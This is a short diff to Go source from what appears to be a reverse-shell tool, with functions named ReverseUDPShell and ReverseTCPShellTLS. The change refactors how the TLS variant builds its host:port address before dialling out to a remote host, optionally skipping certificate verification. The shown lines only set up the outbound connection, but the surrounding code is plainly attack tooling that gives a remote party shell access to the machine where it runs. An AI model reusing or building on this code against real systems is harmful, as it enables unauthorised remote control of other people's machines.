@@ -165,10 +165,11 @@ func ReverseUDPShell(filepath string, host string, port int) {
 
 func ReverseTCPShellTLS(filepath string, host string, port int, skip_verify bool) {
 	//set up the socket
+	addr_string := host + ":" + strconv.Itoa(port)
 	conf := &tls.Config{InsecureSkipVerify: skip_verify}
-	target_conn,err := tls.Dial("tcp4", host + ":" + strconv.Itoa(port), conf)
+	target_conn,err := tls.Dial("tcp4", addr_string, conf)
 	if err != nil {
-		fmt.Println("Error connecting to", host + ":" + strconv.Itoa(port))
+		fmt.Println("Error connecting to", addr_string)
 		fmt.Println(string(err.Error()))
 		return
 	}
